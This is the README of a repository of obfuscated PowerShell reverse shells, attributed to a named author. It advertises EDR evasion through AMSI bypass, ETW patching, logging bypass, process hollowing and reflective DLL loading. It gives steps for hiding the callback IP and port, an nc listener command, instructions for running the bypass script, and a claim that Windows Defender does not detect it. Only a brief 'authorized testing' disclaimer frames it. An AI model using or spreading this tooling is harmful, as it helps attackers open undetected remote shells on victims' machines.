# PowerShell Reverse Shells

Collection of obfuscated PowerShell reverse shells with EDR evasion techniques.

## Warning

**Authorized testing only. Illegal use prohibited.**

## Structure

```
reverse-shells/
├── scripts/     # PowerShell scripts
├── docs/        # Documentation
└── tools/       # Utility tools
```

## Scripts

| Script | Description | Level |
|--------|-------------|-------|
| `reverse_shell.ps1` | Basic version with obfuscation | Beginner |
| `reverse_shell_dll_memory.ps1` | In-memory DLL loading | Intermediate |
| `reverse_shell_dll_memory_edr_bypass.ps1` | AMSI/EDR bypass | Advanced |
| `reverse_shell_process_hollowing_syscallsv2.ps1` | Process Hollowing | Advanced |
| `reverse_shell_process_injection_advanced.ps1` | Process injection | Advanced |

## Features

- In-memory execution (no files on disk)
- AMSI bypass
- ETW patching
- PowerShell Logging bypass
- Process Hollowing
- Reflective DLL loading

## Configuration

### Encode IP to Base64
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("192.168.1.100"))
```

### Calculate Port (example: 4444)
```powershell
[Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12)
```

### Modify in Script
```powershell
# Line ~6-7
$ipB = [Convert]::FromBase64String('YOUR_IP_BASE64');
$prt = [int](([Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12)));
```

## Usage

### Listener (Kali Linux)
```bash
nc -nlvp 4444
```

### Execute Script (Windows)
```powershell
cd scripts
.\reverse_shell_dll_memory_edr_bypass.ps1
```

## Comparison

| Feature | Basic | DLL Memory | EDR Bypass | Process Hollowing |
|---------|-------|------------|------------|-------------------|
| AMSI Bypass | No | No | Yes | Yes |
| ETW Patch | No | No | Yes | Yes |
| Reflective Loading | No | Yes | Yes | Yes |
| In-Memory Execution | No | Yes | Yes | Yes |
| Process Hollowing | No | No | No | Yes |

## Troubleshooting

**Connection refused**: Check listener, IP/port, firewall

**Script closes immediately**: Use `reverse_shell_dll_memory.ps1` or `reverse_shell_dll_memory_edr_bypass.ps1`

**C# compilation error**: Script automatically uses `Add-Type` if `csc.exe` unavailable

## GitHub Preparation

Before publishing, execute:
```powershell
.\tools\prepare_for_github.ps1
```

This replaces hardcoded IPs with placeholders.

## Technical Details

- Tested on Windows 10/11
- Windows Defender: Not detected
- EDR: Detection varies

## Author

Florent Vinai

## License

See [LICENSE](docs/LICENSE) for details.
